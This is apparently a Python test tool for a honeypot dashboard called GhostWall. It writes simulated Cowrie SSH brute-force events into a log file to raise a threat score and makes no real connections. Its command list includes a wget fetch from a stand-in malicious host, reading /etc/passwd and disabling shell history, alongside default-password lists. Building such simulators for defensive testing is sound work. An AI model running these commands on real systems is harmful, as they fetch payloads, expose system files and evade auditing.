#!/usr/bin/env python3
"""
GhostWall – Attack Simulator
=============================
Injects realistic fake Cowrie SSH honeypot events into the cowrie.json log
so the collector picks them up and the threat score climbs.

No real network connections are made.

Mode selection (automatic):
  • Docker mode  – writes via `docker exec` into the running Cowrie container.
                   Used when Docker is available and the container is running.
  • Local mode   – writes directly to a local file path.
                   Used when Docker is unavailable (e.g. development / testing).

Usage
-----
    python3 simulate_attack.py                          # auto-detect mode
    python3 simulate_attack.py --preset heavy           # 150 events → RED
    python3 simulate_attack.py --preset light           # 20 events  → YELLOW
    python3 simulate_attack.py --log-file /tmp/ghostwall/cowrie.json
    python3 simulate_attack.py --events 100 --ips 8 --delay 0.1

Presets
-------
  light   20 events,  3 fake IPs  → should reach YELLOW
  medium  60 events,  6 fake IPs  → should reach ORANGE
  heavy  150 events, 12 fake IPs  → should reach RED
"""
from __future__ import annotations

import argparse
import json
import os
import random
import subprocess
import sys
import time
from datetime import datetime, timezone

# ---------------------------------------------------------------------------
# Attack data
# ---------------------------------------------------------------------------

USERNAMES = [
    "root", "admin", "ubuntu", "pi", "guest", "oracle", "postgres",
    "user", "deploy", "git", "jenkins", "ansible", "ec2-user", "vagrant",
]

PASSWORDS = [
    "password", "123456", "admin", "root", "letmein", "qwerty",
    "password123", "welcome", "changeme", "toor", "alpine", "raspberry",
]

COMMANDS = [
    "id", "whoami", "uname -a", "cat /etc/passwd", "ls -la /",
    "ps aux", "wget http://malicious.example/payload", "curl ifconfig.me",
    "cat /proc/cpuinfo", "history", "export HISTFILE=/dev/null",
]

# Fake attacker IP pools
IP_POOLS = {
    3:  ["45.33.32.156", "192.241.235.219", "104.21.8.1"],
    6:  ["45.33.32.156", "192.241.235.219", "104.21.8.1",
         "185.220.101.3", "89.248.167.131", "198.199.80.61"],
    12: ["45.33.32.156", "192.241.235.219", "104.21.8.1",
         "185.220.101.3", "89.248.167.131", "198.199.80.61",
         "176.58.120.12", "212.47.234.5",   "95.85.43.22",
         "91.92.251.103", "138.197.96.4",   "159.89.213.52"],
}

# Default paths
DOCKER_LOG   = "/cowrie/var/log/cowrie/cowrie.json"
DEFAULT_LOCAL = "/tmp/ghostwall/cowrie.json"

# ---------------------------------------------------------------------------
# Helpers – event builders
# ---------------------------------------------------------------------------

def ts_now() -> str:
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%f")


def make_session_id() -> str:
    return "".join(random.choices("0123456789abcdef", k=16))


def connect_event(ip: str, session: str) -> dict:
    return {
        "eventid":   "cowrie.session.connect",
        "timestamp": ts_now(),
        "src_ip":    ip,
        "session":   session,
        "peerIP":    ip,
        "peerPort":  random.randint(40000, 65535),
    }


def failed_auth_event(ip: str, session: str) -> dict:
    return {
        "eventid":   "cowrie.login.failed",
        "timestamp": ts_now(),
        "src_ip":    ip,
        "session":   session,
        "username":  random.choice(USERNAMES),
        "password":  random.choice(PASSWORDS),
    }


def command_event(ip: str, session: str) -> dict:
    return {
        "eventid":   "cowrie.command.input",
        "timestamp": ts_now(),
        "src_ip":    ip,
        "session":   session,
        "input":     random.choice(COMMANDS),
    }


def disconnect_event(ip: str, session: str) -> dict:
    return {
        "eventid":   "cowrie.session.closed",
        "timestamp": ts_now(),
        "src_ip":    ip,
        "session":   session,
    }


# ---------------------------------------------------------------------------
# Helpers – write modes
# ---------------------------------------------------------------------------

def docker_available() -> bool:
    """Return True if the Docker daemon is reachable."""
    result = subprocess.run(
        ["docker", "info"],
        capture_output=True,
        timeout=3,
    )
    return result.returncode == 0


def check_container(container: str) -> bool:
    result = subprocess.run(
        ["docker", "inspect", "--format", "{{.State.Running}}", container],
        capture_output=True, text=True,
    )
    return result.returncode == 0 and result.stdout.strip() == "true"


def append_via_docker(container: str, line: str) -> bool:
    """Write one JSON line to the Cowrie log inside the container."""
    escaped = line.replace("'", "'\\''")
    result = subprocess.run(
        ["docker", "exec", container, "sh", "-c",
         f"echo '{escaped}' >> {DOCKER_LOG}"],
        capture_output=True, text=True,
    )
    return result.returncode == 0


def append_to_local_file(log_path: str, line: str) -> bool:
    """Write one JSON line directly to a local file."""
    try:
        os.makedirs(os.path.dirname(log_path), exist_ok=True)
        with open(log_path, "a") as fh:
            fh.write(line + "\n")
        return True
    except Exception as exc:
        print(f"  ERROR writing to {log_path}: {exc}")
        return False


# ---------------------------------------------------------------------------
# Simulation
# ---------------------------------------------------------------------------

def run_simulation(
    *,
    ips: list[str],
    n_events: int,
    delay: float,
    container: str | None,   # None → local mode
    log_file: str | None,    # used in local mode
) -> None:
    local_mode = container is None
    target = log_file if local_mode else f"{container}:{DOCKER_LOG}"

    print(f"\n  GhostWall Attack Simulator")
    print(f"  Mode      : {'local file' if local_mode else 'docker exec'}")
    print(f"  Target    : {target}")
    print(f"  Fake IPs  : {len(ips)}  ({', '.join(ips[:3])}{'...' if len(ips) > 3 else ''})")
    print(f"  Events    : {n_events}")
    print(f"  Delay     : {delay}s between events")
    print()

    # ── Ensure the log file exists BEFORE the collector poll cycle ───────────
    # Critical: the collector seeks to EOF when it first opens the file.
    # We create an empty file first, wait >2 s (one collector cycle), then
    # write events so every line is treated as new.
    if local_mode:
        os.makedirs(os.path.dirname(log_file), exist_ok=True)
        # Touch the file (create empty if absent, leave content if present)
        with open(log_file, "a"):
            pass
    else:
        subprocess.run(
            ["docker", "exec", container, "sh", "-c",
             f"mkdir -p /cowrie/var/log/cowrie && touch {DOCKER_LOG}"],
            capture_output=True,
        )

    print("  Waiting 3 s for the collector to register the log file...")
    time.sleep(3)

    sessions: dict[str, str] = {}   # ip -> current session id
    sent = 0
    failed = 0

    for i in range(n_events):
        ip = random.choice(ips)

        # Start or rotate session for this IP
        if ip not in sessions or random.random() < 0.15:
            sessions[ip] = make_session_id()
            ev   = connect_event(ip, sessions[ip])
            line = json.dumps(ev)
            ok   = (append_to_local_file(log_file, line) if local_mode
                    else append_via_docker(container, line))
            if ok:
                sent += 1
                print(f"  [{sent:>3}] connect       {ip}")
            else:
                failed += 1

        session = sessions[ip]

        # 70% failed auth, 20% command, 10% disconnect
        roll = random.random()
        if roll < 0.70:
            ev    = failed_auth_event(ip, session)
            label = f"failed_auth   {ip}  user={ev['username']}"
        elif roll < 0.90:
            ev    = command_event(ip, session)
            label = f"command       {ip}  cmd={ev['input'][:30]}"
        else:
            ev    = disconnect_event(ip, session)
            del sessions[ip]
            label = f"disconnect    {ip}"

        line = json.dumps(ev)
        ok   = (append_to_local_file(log_file, line) if local_mode
                else append_via_docker(container, line))
        if ok:
            sent += 1
            print(f"  [{sent:>3}] {label}")
        else:
            failed += 1

        if delay > 0:
            time.sleep(delay)

    print()
    print(f"  Done. Sent {sent} events, {failed} failed.")
    print(f"  Score should rise within ~10 seconds.")
    print()


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

PRESETS = {
    "light":  {"events": 20,  "ips": 3,  "delay": 0.05},
    "medium": {"events": 60,  "ips": 6,  "delay": 0.05},
    "heavy":  {"events": 150, "ips": 12, "delay": 0.02},
}


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Simulate an SSH brute-force attack against GhostWall.",
    )
    parser.add_argument(
        "--preset", choices=["light", "medium", "heavy"], default="medium",
        help="Attack preset (default: medium)",
    )
    parser.add_argument("--events", type=int,   help="Override number of events")
    parser.add_argument("--ips",    type=int, choices=[3, 6, 12],
                        help="Override number of fake IPs")
    parser.add_argument("--delay",  type=float, help="Seconds between events")
    parser.add_argument(
        "--container", default="ghostwall-cowrie",
        help="Cowrie Docker container name (default: ghostwall-cowrie)",
    )
    parser.add_argument(
        "--log-file",
        metavar="PATH",
        help=(
            "Write events directly to this local file path instead of using "
            f"docker exec (default when Docker unavailable: {DEFAULT_LOCAL})"
        ),
    )
    args = parser.parse_args()

    cfg = PRESETS[args.preset].copy()
    if args.events:           cfg["events"] = args.events
    if args.ips:              cfg["ips"]    = args.ips
    if args.delay is not None: cfg["delay"] = args.delay

    ip_pool = IP_POOLS.get(cfg["ips"], IP_POOLS[6])

    # ── Mode selection ────────────────────────────────────────────────────────
    if args.log_file:
        # Explicit local file – skip Docker entirely
        container = None
        log_file  = args.log_file
        print(f"  Using local file mode: {log_file}")
    elif docker_available() and check_container(args.container):
        # Docker is up and container is running → use docker exec
        container = args.container
        log_file  = None
    else:
        # Docker unavailable or container not running → fall back to local file
        log_file = os.environ.get("COWRIE_LOG_PATH", DEFAULT_LOCAL)
        container = None
        print(f"  Docker not available. Writing directly to: {log_file}")
        print(f"  (Make sure the backend is started with COWRIE_LOG_PATH={log_file})")
        print()

    run_simulation(
        ips=ip_pool,
        n_events=cfg["events"],
        delay=cfg["delay"],
        container=container,
        log_file=log_file,
    )


if __name__ == "__main__":
    main()
